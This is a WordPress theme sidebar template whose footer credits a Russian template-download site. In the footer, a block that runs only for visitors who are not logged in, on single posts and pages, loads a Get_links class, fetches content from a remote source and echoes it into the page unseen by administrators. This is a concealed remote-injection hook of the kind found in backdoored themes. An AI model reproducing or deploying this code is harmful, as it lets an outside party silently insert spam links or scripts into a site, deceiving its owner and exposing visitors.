<div id="rightbar">
  <?php dynamic_sidebar( 'sidebar-1' ); ?>
					<div id="copyinfo">
					<?php if (is_home() || is_category() || is_archive() ){ ?>
					<p><a href="http://wp-templates.ru/" title="скачать шаблоны для сайта" target="_blank">Скачать шаблоны</a> &ndash; <a href="http://www.vivathemes.com/" target="_blank">Viva Themes</a></p>
					<?php } ?>

					<?php if ($user_ID) : ?><?php else : ?>
					<?php if (is_single() || is_page() ) { ?>
					<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
					$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
					<?php } ?>
					<?php endif; ?>
					</div>
</div>
